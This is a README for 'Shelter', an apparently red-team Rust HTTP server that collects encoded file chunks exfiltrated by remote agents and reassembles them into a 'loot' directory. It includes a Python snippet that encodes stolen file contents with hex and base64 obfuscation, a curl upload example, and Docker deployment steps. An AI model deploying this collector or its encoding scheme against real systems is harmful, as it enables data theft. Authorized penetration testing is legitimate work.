# Shelter - Red Team Exfiltration Toolkit

## Main Objective

**Shelter** is a specialized toolkit designed for Red Team engagements that involve an exfiltration phase. It provides a lightweight HTTP server that receives encoded file portions from remote agents, assembles them in-memory, and persists the reconstructed files to disk. The toolkit is optimized for:

- **Reliable file reassembly**: Incoming file portions are indexed and stored in deterministic order using a BTreeMap structure
- **Flexible encoding support**: Supports hex and base64 encoding layers for payload obfuscation during network transport
- **Asynchronous processing**: Non-blocking handling of incoming portions with background file assembly and persistence
- **Minimal footprint**: Single-worker HTTP server with configurable listen address and output directory
- **Error resilience**: Graceful error handling that logs failures while continuing to process subsequent portions

## Commands Available

### HTTP Server

```bash
cargo run -- http-server [OPTIONS]
```

**Subcommand**: `http-server`

Launches an Actix-based HTTP server that accepts POST requests containing encoded exfiltrated file portions.

**Options**:
- `-l, --listen <ADDRESS>` — HTTP server listen address (default: `127.0.0.1:8080`)
- `--output-dir <PATH>` — Directory to store exfiltrated files (default: `loot`)

**Example**:
```bash
# Listen on all interfaces, port 9000, store files in /tmp/exfil
cargo run -- http-server -l 0.0.0.0:9000 --output-dir /tmp/exfil
```

### Endpoint

The HTTP server registers a single POST endpoint at `/` that accepts `Content-Type: text/plain` requests.

**Request Format**:
- Method: `POST`
- Path: `/`
- Content-Type: `text/plain`
- Body: Encoded payload string

**Expected Payload Encoding** (for remote agent):

The payload must be encoded in the following order:

1. **Build the base payload**: `<file_name>:<index>:<file_chunk>:<last_marker?>`
   - `file_name`: Name of the file being exfiltrated
   - `index`: Zero-based sequence number for this portion (e.g., 0, 1, 2, ...)
   - `file_chunk`: Hex-encoded base64-encoded bytes of the file content chunk
   - `last_marker`: Any non-empty string (e.g., "1") if this is the final portion, omit otherwise

2. **Base64 encode** the entire payload string

3. **Hex encode** the resulting base64 bytes

**Example Payload Generation** (Python):

```python
import base64
import binascii

# Build the base payload
file_name = "secret.txt"
index = 0
file_chunk = binascii.hexlify(base64.b64encode(b"This is secret data")).decode()
is_last = "1"  # Mark as last portion

payload = f"{file_name}:{index}:{file_chunk}:{is_last}"

# Base64 encode
b64_payload = base64.b64encode(payload.encode()).decode()

# Hex encode
hex_payload = binascii.hexlify(b64_payload.encode()).decode()

print(hex_payload)
```

**Example HTTP Request**:

```bash
curl -X POST http://127.0.0.1:8080/ \
  -H "Content-Type: text/plain" \
  -d "encoded_hex_payload_here"
```

### Response Codes

- **200 OK**: Portion successfully parsed and queued for processing
- **400 Bad Request**: Payload decoding or parsing error (invalid encoding, malformed format)
- **500 Internal Server Error**: Channel send failure or internal processing error

## Installation

### Prerequisites

- Rust 1.70 or later (install from [rustup.rs](https://rustup.rs/))
- Cargo (included with Rust)

### Build from Source

```bash
# Clone or navigate to the shelter directory
cd hunk/shelter

# Build the release binary
cargo build --release

# The binary will be available at: target/release/shelter
```

### Run Directly

```bash
# From the shelter directory, run with default settings
cargo run -- http-server

# Or with custom settings
cargo run -- http-server -l 0.0.0.0:8080 --output-dir ./loot
```

### Docker (Optional)

You can containerize the application by creating a `Dockerfile` in the `shelter` directory:

```dockerfile
FROM rust:latest as builder
WORKDIR /shelter
COPY . .
RUN cargo build --release

FROM debian:bookworm-slim
RUN apt-get update && apt-get install -y ca-certificates && rm -rf /var/lib/apt/lists/*
COPY --from=builder /shelter/target/release/shelter /usr/local/bin/
EXPOSE 8080
ENTRYPOINT ["shelter"]
CMD ["http-server", "-l", "0.0.0.0:8080"]
```

Build and run:
```bash
docker build -t shelter .
docker run -p 8080:8080 -v $(pwd)/loot:/loot shelter http-server -l 0.0.0.0:8080 --output-dir /loot
```

## Architecture Overview

### Data Flow

```
Remote Agent (sends POST)
    ↓
HTTP POST Handler
    ↓
ExfiltratedFilePortion::try_from() [decoding & parsing]
    ↓
tokio mpsc channel (transfer_channel)
    ↓
handle_received_data() [background consumer]
    ↓
In-memory HashMap<file_name, ExfiltratedFile>
    ↓ (on is_last_portion == true)
ExfiltratedFile::get_file_contents() [reassembly & decoding]
    ↓
fs::write() → Loot Directory
```

### Key Components

#### `ExfiltratedFilePortion`
- Represents a single received chunk of an exfiltrated file
- Fields: `file_name`, `index`, `file_content`, `is_last_portion`
- Implements `TryFrom<String>` to parse and decode incoming payloads

#### `ExfiltratedFile`
- Accumulates multiple portions into a single file
- Uses `BTreeMap<usize, Vec<u8>>` for deterministic ordering
- `get_file_contents()` reconstructs and decodes the full file

#### HTTP Handler (`post_handler`)
- Receives raw POST body string
- Parses into `ExfiltratedFilePortion`
- Sends to background queue via channel

#### Event Handler (`handle_received_data`)
- Runs in a spawned Tokio task
- Consumes from receiver channel
- Accumulates portions, writes completed files to disk
- Creates output directory if it doesn't exist

#### Error Handling
- `AppError`: Unified internal error type (DecodeError, ConverterError, ParserError)
- `HTTPResponseError`: Maps internal errors to HTTP status codes
- All errors are logged; failures do not halt processing

## Todo List

- [ ] **Configuration File Support**: Add `.toml` or `.json` config file parsing with CLI precedence rules
- [ ] **Dead-Letter Queue**: Implement a DLQ for file portions that fail parsing/processing
- [ ] **Circuit Breaker**: Add circuit breaker pattern to the event handler loop to prevent infinite retries on persistent failures
- [ ] **TLS/HTTPS Support**: Enable HTTPS with configurable certificate paths for encrypted transport
- [ ] **Authentication**: Add API key or mutual TLS authentication to restrict access
- [ ] **Metrics & Monitoring**: Export Prometheus metrics for file count, portion count, and error rates
- [ ] **Batch Processing**: Support receiving multiple files in parallel with configurable concurrency limits
- [ ] **Resume Capability**: Persist portion metadata to allow resumption of interrupted transfers
- [ ] **Unit & Integration Tests**: Comprehensive test suite for payload parsing and file reassembly
- [ ] **Compression Support**: Add optional gzip/deflate compression for payload optimization

## Disclaimer

**IMPORTANT**: This toolkit is provided for authorized Red Team engagements and security research purposes only.

### Legal Notice

- **Authorization Required**: This tool should only be used on systems and networks where you have explicit written permission from the owner or authorized representative.

### Operational Considerations

- **Logging**: All exfiltrated data is logged at INFO level. Review logs carefully before leaving the engagment environment.
- **Artifact Cleanup**: Ensure the `loot` directory and its contents are removed from the target system upon completion.
- **Network Visibility**: The HTTP server is visible on the configured network interface. Use firewall rules to restrict access.
- **Persistence**: Be aware of any file system artifacts left by Rust/Tokio runtime or temporary files created during operation.

### No Warranty

This software is provided "as is" without warranty of any kind, express or implied. The authors are not liable for any damage, data loss, or legal consequences resulting from its use.
